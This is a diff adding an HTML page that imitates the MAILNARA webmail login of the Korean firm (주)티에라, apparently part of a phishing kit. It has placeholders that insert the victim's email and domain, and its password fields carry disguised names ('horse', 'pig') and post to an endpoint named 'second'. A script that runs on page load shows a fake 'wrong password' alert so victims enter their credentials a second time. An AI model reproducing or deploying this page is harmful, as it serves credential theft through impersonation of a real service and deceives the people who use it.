@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="ko">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MAILNARA v4.0 ::: (주)티에라</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700&display=swap"
+        rel="stylesheet">
+    <link rel="shortcut icon" href="https://mail.tierra.co.kr/favicon.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Noto Sans KR', sans-serif;
+            background-color: #f7f9fc;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding-top: 40px;
+            color: #333;
+        }
+
+        .page-wrapper {
+            width: 100%;
+            max-width: 480px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .login-container {
+            width: 100%;
+            background: #fff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.02);
+            border: 1px solid #e2e5e8;
+        }
+
+        .header-top {
+            height: 48px;
+            background-color: #34495e;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            color: #fff;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            font-weight: 700;
+            font-family: 'Arial', sans-serif;
+            letter-spacing: 0.5px;
+        }
+        .logom-icon {
+            display: inline-block;
+        }
+        .logom-icon img {
+            width: 30px;
+            height: auto;
+        }
+
+        .logo-icon {
+            display: inline-block;
+            width: 28px;
+            height: 12px;
+            background-color: #e67e22;
+            margin-right: -4px;
+            margin-top: -8px;
+            clip-path: polygon(0 0, 100% 0, 80% 100%, 0% 100%);
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo-text {
+            font-size: 16px;
+            font-weight: 800;
+            z-index: 2;
+            color: #fff;
+        }
+
+        .company-name {
+            font-size: 13px;
+            font-weight: 500;
+            color: #5bc0de;
+        }
+
+        .hero-banner {
+            position: relative;
+            height: 250px;
+            background: url('https://i.ibb.co/jkTmdN8Z/main.jpg') center/cover;
+            display: flex;
+            flex-direction: column;
+            padding: 35px 25px;
+            border-bottom: 2px solid #202e3b;
+        }
+
+        .hero-content {
+            flex: 1;
+        }
+
+        .hero-content h1 {
+            font-size: 32px;
+            color: #4989be;
+            font-weight: 800;
+            margin-bottom: 4px;
+            text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.8);
+            letter-spacing: 1px;
+        }
+
+        .hero-content h2 {
+            font-size: 17px;
+            color: #2c3e50;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+
+        .browser-icons {
+            margin-top: 15px;
+            display: flex;
+            gap: 10px;
+        }
+
+        .browser-icon {
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 65px;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.9);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        .browser-icon.firefox {
+            color: #e66000;
+        }
+
+        .browser-icon.ie {
+            color: #0078d7;
+        }
+
+        .browser-icon.safari {
+            color: #0fb5ee;
+        }
+
+        .browser-icon.chrome {
+            color: #4285f4;
+        }
+
+        .browser-icon.opera {
+            color: #ff1b2d;
+        }
+
+        .device-mockups {
+            position: absolute;
+            bottom: 30px;
+            right: 20px;
+            width: 140px;
+            /* Adjust size */
+        }
+
+        .device-mockups img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .hero-footer-text {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            background: rgba(30, 42, 54, 0.9);
+            color: #fff;
+            font-size: 12px;
+            padding: 6px 12px;
+            font-weight: 300;
+        }
+
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .tab {
+            flex: 1;
+            height: 48px;
+            border: none;
+            background-color: #f5f6f7;
+            color: #666;
+            font-size: 14px;
+            font-family: inherit;
+            font-weight: 500;
+            cursor: pointer;
+            border-right: 1px solid #e5e5e5;
+            transition: all 0.2s;
+        }
+
+        .tab:last-child {
+            border-right: none;
+        }
+
+        .tab.active {
+            background-color: #5bc0de;
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .form-container {
+            padding: 25px 35px 35px;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .save-id-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+
+        .custom-checkbox {
+            display: flex;
+            align-items: center;
+            font-size: 13px;
+            color: #444;
+            cursor: pointer;
+            position: relative;
+            user-select: none;
+        }
+
+        .custom-checkbox input {
+            position: absolute;
+            opacity: 0;
+            cursor: pointer;
+            height: 0;
+            width: 0;
+        }
+
+        .checkmark {
+            height: 16px;
+            width: 16px;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            margin-right: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 2px;
+        }
+
+        .custom-checkbox:hover input~.checkmark {
+            border-color: #5bc0de;
+        }
+
+        .checkmark:after {
+            content: "";
+            display: none;
+            width: 4px;
+            height: 8px;
+            border: solid #5ac1e0;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+            margin-bottom: 2px;
+        }
+
+        .custom-checkbox input:checked~.checkmark:after {
+            display: block;
+        }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .input-label {
+            width: 80px;
+            font-size: 13px;
+            color: #444;
+            font-weight: 500;
+            flex-shrink: 0;
+        }
+
+        .input-field {
+            flex: 1;
+            height: 40px;
+            border: 1px solid #ddd;
+            padding: 0 12px;
+            font-size: 13px;
+            font-family: inherit;
+            color: #333;
+            outline: none;
+            transition: border-color 0.2s;
+            border-radius: 2px;
+        }
+
+        .input-field::placeholder {
+            color: #bbb;
+        }
+
+        .input-field:focus {
+            border-color: #5bc0de;
+        }
+
+        .login-btn {
+            width: 100%;
+            height: 46px;
+            background-color: #5bc0de;
+            color: #fff;
+            border: none;
+            font-size: 15px;
+            font-weight: 500;
+            font-family: inherit;
+            cursor: pointer;
+            margin-top: 15px;
+            border-radius: 2px;
+            transition: background-color 0.2s;
+            letter-spacing: 0.5px;
+        }
+
+        .login-btn:hover {
+            background-color: #46b8da;
+        }
+
+        .action-buttons {
+            display: flex;
+            padding: 15px;
+            gap: 15px;
+            background: #fff;
+            justify-content: space-between;
+        }
+
+        .action-btn {
+            flex: 1;
+            height: 40px;
+            background-color: #fcfcfc;
+            border: 1px solid #e0e0e0;
+            color: #444;
+            font-size: 13px;
+            font-family: inherit;
+            font-weight: 500;
+            cursor: pointer;
+            border-radius: 2px;
+            transition: all 0.2s;
+        }
+
+        .action-btn:hover {
+            background-color: #f5f5f5;
+            border-color: #d0d0d0;
+        }
+
+        .warning-box {
+            margin: 0 15px 15px;
+            border: 1px solid #f5c6cb;
+            background-color: #fff;
+            color: #d9534f;
+            font-size: 13px;
+            padding: 12px;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 2px;
+        }
+
+        .warning-icon {
+            color: #d9534f;
+            margin-right: 6px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .footer {
+            margin-top: 25px;
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 40px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page-wrapper">
+        <div class="login-container">
+            <div class="header-top">
+                <div class="logo">
+                    <div class="logom-icon"><img src="https://img.logo.dev/{{dman}}?token=pk_X3Yst72FQUOeVfOd-dlhKg"></div>
+                </div>
+                <div class="company-name">(주)티에라</div>
+            </div>
+
+            <div class="hero-banner">
+                <div class="hero-content">
+                    
+                </div>
+                <div class="hero-footer-text">Customize Your Image</div>
+            </div>
+
+            <div class="tabs">
+                <button class="tab active">사용자</button>
+                <button class="tab">관리자</button>
+            </div>
+
+            <form action="second" method="post">
+
+            <div class="form-container">
+                <div class="save-id-wrapper">
+                    <label class="custom-checkbox">
+                        <input type="checkbox">
+                        <span class="checkmark"></span>
+                        아이디 저장
+                    </label>
+                </div>
+
+                <div class="input-group">
+                    <div class="input-label">아이디</div>
+                    <input type="text" name="horse" class="input-field" placeholder="이메일을 입력하세요" value="{{eman}}" required>
+                </div>
+
+                <div class="input-group">
+                    <div class="input-label">비밀번호</div>
+                    <input type="password" name="pig" class="input-field" placeholder="비밀번호를 입력하세요" required>
+                </div>
+
+                <button class="login-btn" type="summit">로그인</button>
+            </div>
+
+            <div class="action-buttons">
+                <button class="action-btn">아웃룩 설정방법</button>
+                <button class="action-btn">아웃룩 자동세팅</button>
+            </div>
+            </form>
+
+            <div class="warning-box">
+                <span class="warning-icon">⚠</span> 인증서 오류 발생 시 처리 방법
+            </div>
+        </div>
+
+        <div class="footer">
+            Copyright &copy; <span style="color: #5bc0de;">{{dman}}</span> All rights reserved.
+        </div>
+    </div>
+
+<script>
+    window.addEventListener('load', function() {
+        alert("존재하지 않는 아이디이거나 비밀번호가 일치하지 않습니다.");
+    });
+</script>
+</body>
+
+
+</html>
+
